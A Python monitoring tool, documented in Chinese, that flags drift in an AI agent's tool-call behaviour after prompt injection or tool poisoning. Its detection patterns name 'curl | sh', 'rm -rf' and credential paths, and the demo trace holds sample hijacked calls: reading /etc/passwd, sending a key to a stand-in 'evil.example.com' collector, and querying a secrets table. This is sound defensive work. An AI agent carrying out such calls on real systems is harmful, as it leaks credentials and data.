#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AgentDriftWatch -- agent 行为基线漂移检测（rain.op Day 46 · 监测向）

agent 正常工作时，工具调用有自己的“习惯”：常用哪几个工具、各占多大
比例、一般在什么时段跑、参数长什么样、错误率多高。一旦被提示注入、
工具投毒或配置改错劫持，调用行为会先于业务结果露出马脚：突然冒出
一个从没用过的危险工具、某个工具调用量翻几倍、半夜出现批量调用、
参数里多出外发地址或系统路径、错误率陡升。

AgentDriftWatch 读一份基线（baseline.json）和一段时间的工具调用轨迹
（trace.jsonl），按五组规则逐项比对漂移，给每个 agent 打 0-100 风险分，
输出漂移报告。所有判断基于本地日志，不调用任何外部 API。

与 Day 40 ToolChainWatch（调用链异常）不同：那里看单条调用链内部是
否危险（危险调用链、密钥外发、循环调用）；这里看一段时间的行为分布
相对基线是否漂移，抓的是“习惯变了”。与 Day 34 MCPGuard（调用时拦截）
不同：那里是实时网关，调用当场放行或拦截；这里是事后审计，对账用。
与 Day 36 AgentIncidentDesk（事件台账）不同：那里汇总已确认的异常
事件做日报；这里发现漂移信号本身，可把输出喂给 IncidentDesk 入账。

五组漂移规则：
  1. 新工具出现      -- 轨迹里出现基线中没有的工具（尤其危险工具）
  2. 频率漂移        -- 某工具调用占比相对基线成倍变化
  3. 参数模式漂移    -- 出现新参数键、敏感参数值、参数长度暴涨
  4. 时间漂移        -- 基线静默时段出现批量调用
  5. 错误率/耗时漂移 -- 错误率或平均耗时相对基线陡升

只用 Python 标准库，离线可运行，不调用任何外部 API。

用法：
    python agentdriftwatch.py --demo                       # 内置演示：基线 + 植入漂移的轨迹
    python agentdriftwatch.py --baseline base.json --trace trace.jsonl
    python agentdriftwatch.py --baseline base.json --trace trace.jsonl --json report.json
    python agentdriftwatch.py --baseline base.json --trace trace.jsonl --agent worker-1
    python agentdriftwatch.py --baseline base.json --init-trace trace.jsonl  # 从轨迹生成基线
"""
import argparse
import json
import math
import os
import re
import sys
from collections import Counter, defaultdict
from datetime import datetime

HERE = os.path.dirname(os.path.abspath(__file__))

# 危险工具：基线里没有、轨迹里突然出现时直接高危
DANGEROUS_TOOLS = {
    "shell.exec", "shell.run", "bash.exec", "system.exec",
    "file.delete", "file.write", "db.drop", "db.delete",
    "network.send", "http.post", "secret.read", "env.read",
}
# 敏感参数值形态：外发地址、系统路径、凭据字段
SENSITIVE_ARG_PATTERNS = [
    (r"https?://[^\s\"']+", "外发 URL"),
    (r"/etc/|/root/|C:\\\\Windows|/proc/|~/.ssh", "系统路径"),
    (r"(?i)(api[_-]?key|password|passwd|token|secret)\s*[:=]", "凭据字段"),
    (r"(?i)\b(rm\s+-rf|chmod\s+\+x|curl\s+.*\|\s*(sh|bash)|wget\s+.*\|\s*sh)\b", "危险命令片段"),
]

RISK_BANDS = [(80, "高危"), (50, "中危"), (20, "低危"), (0, "正常")]


def risk_band(score):
    for threshold, name in RISK_BANDS:
        if score >= threshold:
            return name
    return "正常"


def hour_of(ts):
    """ISO 时间戳取小时；解析失败返回 None。"""
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00")).hour
    except (ValueError, AttributeError, TypeError):
        return None


def load_trace(path):
    """读 JSONL 轨迹：每行 {ts, agent, tool, args, status, duration_ms}。"""
    calls = []
    with open(path, "r", encoding="utf-8") as f:
        for lineno, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except json.JSONDecodeError as e:
                print(f"警告：第 {lineno} 行 JSON 解析失败，已跳过：{e}", file=sys.stderr)
                continue
            rec["_lineno"] = lineno
            calls.append(rec)
    return calls


def build_baseline(calls):
    """从一段“干净”轨迹生成基线：工具分布、参数键、活跃时段、错误率、耗时。"""
    tools = Counter()
    arg_keys = defaultdict(Counter)
    hours = Counter()
    total = len(calls)
    errors = 0
    durations = defaultdict(list)
    for c in calls:
        tool = c.get("tool", "?")
        tools[tool] += 1
        args = c.get("args") or {}
        if isinstance(args, dict):
            for k in args:
                arg_keys[tool][k] += 1
        h = hour_of(c.get("ts", ""))
        if h is not None:
            hours[h] += 1
        if str(c.get("status", "ok")).lower() not in ("ok", "success", "200"):
            errors += 1
        try:
            durations[tool].append(float(c.get("duration_ms", 0)))
        except (TypeError, ValueError):
            pass
    return {
        "total_calls": total,
        "tools": {t: n / total for t, n in tools.items()} if total else {},
        "tool_counts": dict(tools),
        "arg_keys": {t: sorted(ks) for t, ks in arg_keys.items()},
        "active_hours": sorted(hours),
        "error_rate": errors / total if total else 0.0,
        "avg_duration_ms": {
            t: round(sum(v) / len(v), 1) for t, v in durations.items() if v
        },
    }


def detect_drift(baseline, calls, agent=None):
    """五组规则比对，返回按 agent 分组的漂移发现与风险分。"""
    if agent is not None:
        calls = [c for c in calls if c.get("agent") == agent]
    total = len(calls)
    findings = []  # 每条：{rule, level, tool, detail, score}
    base_tools = baseline.get("tools", {})
    base_arg_keys = baseline.get("arg_keys", {})
    base_hours = set(baseline.get("active_hours", []))
    base_err = baseline.get("error_rate", 0.0)
    base_dur = baseline.get("avg_duration_ms", {})

    def add(rule, level, tool, detail, score):
        for f in findings:
            if (f["rule"], f["level"], f["tool"], f["detail"]) == (rule, level, tool, detail):
                f["count"] += 1
                return
        findings.append({
            "rule": rule, "level": level, "tool": tool or "-",
            "detail": detail, "score": score, "count": 1,
        })

    if total == 0:
        return {"agent": agent or "全部", "total_calls": 0,
                "risk_score": 0, "band": "正常",
                "findings": [{"rule": "无数据", "level": "低危", "tool": "-",
                              "detail": "轨迹为空，无法比对基线", "score": 0}]}

    tools = Counter(c.get("tool", "?") for c in calls)

    # 规则 1：新工具出现
    for tool, n in sorted(tools.items()):
        if tool not in base_tools:
            if tool in DANGEROUS_TOOLS:
                add("新工具出现", "高危", tool,
                    f"基线中不存在的危险工具，出现 {n} 次（占 {n / total:.1%}）。"
                    "可能被注入新增了高权限调用，立即核查来源与审批记录。", 30)
            else:
                add("新工具出现", "中危", tool,
                    f"基线中不存在的新工具，出现 {n} 次（占 {n / total:.1%}）。"
                    "可能是正常新增能力，也可能是配置变更未更新基线。", 12)

    # 规则 2：频率漂移（占比成倍变化）
    for tool, n in sorted(tools.items()):
        if tool not in base_tools:
            continue
        share = n / total
        base_share = base_tools[tool]
        if base_share <= 0:
            continue
        ratio = share / base_share
        if ratio >= 3 and n >= 5:
            add("频率漂移", "高危" if ratio >= 5 else "中危", tool,
                f"调用占比由基线 {base_share:.1%} 升至 {share:.1%}（{ratio:.1f} 倍），"
                "疑似循环调用、批量外发或被注入放大调用量。", 25 if ratio >= 5 else 15)
        elif ratio <= 0.25 and base_tools[tool] >= 0.05:
            add("频率漂移", "低危", tool,
                f"调用占比由基线 {base_share:.1%} 降至 {share:.1%}，"
                "常用工具突然少用，可能任务改道或调用被劫持到别处。", 5)

    # 规则 3：参数模式漂移
    arg_len = defaultdict(list)
    for c in calls:
        tool = c.get("tool", "?")
        args = c.get("args")
        if not isinstance(args, dict):
            continue
        known = set(base_arg_keys.get(tool, []))
        for k, v in args.items():
            if tool in base_arg_keys and k not in known:
                add("参数模式漂移", "中危", tool,
                    f"出现基线没有的新参数键 `{k}`，"
                    "可能在传基线外的数据，先核对该参数的用途与审批。", 12)
            text = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False)
            for pat, label in SENSITIVE_ARG_PATTERNS:
                if re.search(pat, text):
                    add("参数模式漂移", "高危", tool,
                        f"参数 `{k}` 出现敏感内容（{label}）：{text[:80]}。"
                        "疑似凭据/系统路径外发或危险命令，立即阻断并复核。", 28)
                    break
            arg_len[(tool, k)].append(len(text))
    # 参数长度暴涨：同一工具同一参数键的 p90 长度相对 p10 水平暴涨
    for (tool, k), lens in sorted(arg_len.items()):
        if len(lens) >= 5:
            lens_sorted = sorted(lens)
            p90 = lens_sorted[int(len(lens_sorted) * 0.9)]
            p10 = lens_sorted[max(0, len(lens_sorted) // 10)]
            if p10 > 0 and p90 >= max(3 * p10, 200):
                add("参数模式漂移", "中危", tool,
                    f"参数 `{k}` 长度 p90 为 {p90} 字符，约为轨迹早期水平的 "
                    f"{p90 / p10:.1f} 倍，疑似批量塞数据或载荷膨胀。", 12)

    # 规则 4：时间漂移
    off_hours = Counter()
    for c in calls:
        h = hour_of(c.get("ts", ""))
        if h is not None and base_hours and h not in base_hours:
            off_hours[h] += 1
    off_total = sum(off_hours.values())
    if base_hours and off_total >= 5 and off_total / total >= 0.1:
        hours_str = "、".join(f"{h}:00（{n} 次）" for h, n in sorted(off_hours.items()))
        add("时间漂移", "高危" if off_total / total >= 0.3 else "中危", "-",
            f"基线静默时段出现 {off_total} 次调用（占 {off_total / total:.1%}）：{hours_str}。"
            "非工作时段批量调用是注入后持续外发或定时任务被改的常见信号。", 25 if off_total / total >= 0.3 else 12)

    # 规则 5：错误率 / 耗时漂移
    errors = sum(1 for c in calls
                 if str(c.get("status", "ok")).lower() not in ("ok", "success", "200"))
    err_rate = errors / total
    if err_rate >= max(3 * base_err, 0.1) and errors >= 3:
        add("错误率漂移", "中危", "-",
            f"错误率由基线 {base_err:.1%} 升至 {err_rate:.1%}（{errors} 次失败），"
            "可能是目标服务被改、参数被污染或探测行为增多。", 15)
    durs = defaultdict(list)
    for c in calls:
        try:
            durs[c.get("tool", "?")].append(float(c.get("duration_ms", 0)))
        except (TypeError, ValueError):
            pass
    for tool, vals in sorted(durs.items()):
        if tool in base_dur and len(vals) >= 5 and base_dur[tool] > 0:
            avg = sum(vals) / len(vals)
            if avg >= 3 * base_dur[tool]:
                add("耗时漂移", "低危", tool,
                    f"平均耗时由基线 {base_dur[tool]:.0f}ms 升至 {avg:.0f}ms"
                    f"（{avg / base_dur[tool]:.1f} 倍），"
                    "可能工具被挂了代理、参数变大或后端被替换。", 8)

    # 汇总：同一发现只计一次分（count 只影响展示，不重复刷分）
    best = {}
    for f in findings:
        key = (f["rule"], f["tool"], f["detail"][:40])
        best[key] = max(best.get(key, 0), f["score"])
    score = min(100, sum(best.values()))
    # 高危发现至少 50 分起步，避免“多条中危淹没一条高危”
    if any(f["level"] == "高危" for f in findings):
        score = max(score, 50)
    return {"agent": agent or "全部", "total_calls": total,
            "risk_score": score, "band": risk_band(score),
            "findings": findings}


def print_report(report):
    print(f"AgentDriftWatch 行为基线漂移报告  |  agent: {report['agent']}  |  调用: {report['total_calls']} 条")
    print(f"风险分：{report['risk_score']}/100（{report['band']}）")
    if not report["findings"]:
        print("未发现漂移：当前行为与基线一致。")
        return
    print(f"发现 {len(report['findings'])} 条漂移信号：")
    order = {"高危": 0, "中危": 1, "低危": 2}
    for i, f in enumerate(sorted(report["findings"],
                                key=lambda x: (order.get(x["level"], 3), x["rule"])), 1):
        print(f"[{i}] [{f['level']}] {f['rule']} · {f['tool']}（+{f['score']} 分）"
              + (f" ×{f.get('count', 1)} 次" if f.get("count", 1) > 1 else ""))
        print(f"    {f['detail']}")


def demo_data():
    """内置演示：基线 200 次干净调用 + 120 次植入 5 类漂移的轨迹。"""
    baseline_calls = []
    tools = [("search.web", 0.40), ("file.read", 0.25), ("db.query", 0.20),
             ("http.fetch", 0.10), ("calc.eval", 0.05)]
    i = 0
    for tool, share in tools:
        for _ in range(int(200 * share)):
            baseline_calls.append({
                "ts": f"2026-11-20T{9 + (i % 8):02d}:{(i * 7) % 60:02d}:00",
                "agent": "worker-1", "tool": tool,
                "args": {"query": "季度报表"} if tool == "search.web" else
                        {"path": "/data/report.md"} if tool == "file.read" else
                        {"sql": "SELECT id FROM users LIMIT 10"} if tool == "db.query" else
                        {"url": "https://example.com/api"} if tool == "http.fetch" else
                        {"expr": "1+2"},
                "status": "ok", "duration_ms": 120 + (i % 50),
            })
            i += 1
    baseline = build_baseline(baseline_calls)

    trace = []
    # 正常部分：60 次，沿用基线习惯
    for j in range(60):
        trace.append({
            "ts": f"2026-11-21T{9 + (j % 8):02d}:{(j * 5) % 60:02d}:00",
            "agent": "worker-1", "tool": ["search.web", "file.read", "db.query"][j % 3],
            "args": {"query": "季度报表"} if j % 3 == 0 else
                    {"path": "/data/report.md"} if j % 3 == 1 else
                    {"sql": "SELECT id FROM users LIMIT 10"},
            "status": "ok", "duration_ms": 130,
        })
    # 漂移 1：新危险工具 shell.exec 出现 6 次
    for j in range(6):
        trace.append({
            "ts": f"2026-11-21T14:{10 + j:02d}:00", "agent": "worker-1",
            "tool": "shell.exec", "args": {"cmd": "cat /etc/passwd"},
            "status": "ok", "duration_ms": 90,
        })
    # 漂移 2：http.fetch 频率暴涨 24 次（基线占比 10% -> 约 20%）
    for j in range(24):
        trace.append({
            "ts": f"2026-11-21T15:{j:02d}:00", "agent": "worker-1",
            "tool": "http.fetch",
            "args": {"url": "https://evil.example.com/collect?k=abc123"},
            "status": "ok", "duration_ms": 400,
        })
    # 漂移 3：凌晨静默时段批量调用 12 次
    for j in range(12):
        trace.append({
            "ts": f"2026-11-21T03:{j * 4:02d}:00", "agent": "worker-1",
            "tool": "db.query", "args": {"sql": "SELECT * FROM secrets"},
            "status": "error", "duration_ms": 2000,
        })
    # 漂移 4：参数长度暴涨（search.web 塞入长文本）
    for j in range(8):
        trace.append({
            "ts": f"2026-11-21T16:{j:02d}:00", "agent": "worker-1",
            "tool": "search.web", "args": {"query": "x" * 1200},
            "status": "ok", "duration_ms": 300,
        })
    return baseline, trace


def main():
    ap = argparse.ArgumentParser(description="AgentDriftWatch：agent 行为基线漂移检测")
    ap.add_argument("--demo", action="store_true", help="内置演示：基线 + 植入漂移的轨迹")
    ap.add_argument("--baseline", help="基线 JSON 路径（build_baseline 输出或 --init-trace 生成）")
    ap.add_argument("--trace", help="轨迹 JSONL 路径")
    ap.add_argument("--init-trace", help="从一段干净轨迹生成基线 JSON（与 --baseline 联用输出）")
    ap.add_argument("--agent", help="只分析指定 agent")
    ap.add_argument("--json", dest="json_out", help="报告写到指定 JSON 文件")
    args = ap.parse_args()

    if args.init_trace:
        calls = load_trace(args.init_trace)
        baseline = build_baseline(calls)
        out = args.baseline or "baseline.json"
        with open(out, "w", encoding="utf-8") as f:
            json.dump(baseline, f, ensure_ascii=False, indent=2)
        print(f"基线已生成：{len(calls)} 次调用，{len(baseline['tools'])} 个工具，"
              f"活跃时段 {baseline['active_hours']}，错误率 {baseline['error_rate']:.1%} -> {out}")
        return 0

    if args.demo:
        baseline, trace = demo_data()
    else:
        if not args.baseline or not args.trace:
            ap.error("--demo 或 --baseline + --trace 二选一")
        with open(args.baseline, "r", encoding="utf-8") as f:
            baseline = json.load(f)
        trace = load_trace(args.trace)

    report = detect_drift(baseline, trace, agent=args.agent)
    print_report(report)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        print(f"JSON 报告已写入：{args.json_out}")
    # 高危漂移返回退出码 1，便于接入 CI/告警
    return 1 if report["risk_score"] >= 80 else 0


if __name__ == "__main__":
    sys.exit(main())
